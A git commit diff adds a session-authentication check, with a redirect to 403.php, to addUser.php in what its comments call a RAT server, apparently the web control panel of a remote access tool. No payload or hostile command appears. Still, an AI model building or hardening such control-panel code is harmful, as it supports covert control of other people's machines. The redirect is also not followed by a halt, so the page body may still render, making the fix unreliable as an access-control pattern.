fa82aa3a3932dc8aae5ee6d893d2d4afac6b3ad0
root <t3ntman@gmail.com>
2016-08-25 12:31:06 -0600

    Fixed issue where you could view page unauthenticated

--- Server/addUser.php
+++ Server/addUser.php
@@ -1,7 +1,16 @@
-<?php  
-    # Necessary at the top of every page for session management
-    session_start();
-  
+<?php
+  # Necessary at the top of every page for session management
+  session_start();
+
+  # If the RAT user isn't authenticated
+  if (!isset($_SESSION["authenticated"]))
+  {
+    # Redirects them to 403.php page
+    header("Location: 403.php");
+  }
+  # Else they are authenticated
+  else
+  {
     # Includes the RAT configuration file
     include "config/config.php";
 
@@ -9,6 +18,7 @@
     # Uses variables from "config/config.php"
     # "SET NAMES utf8" is necessary to be Unicode-friendly
     $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
+  }
 ?>
 
 <!doctype html>
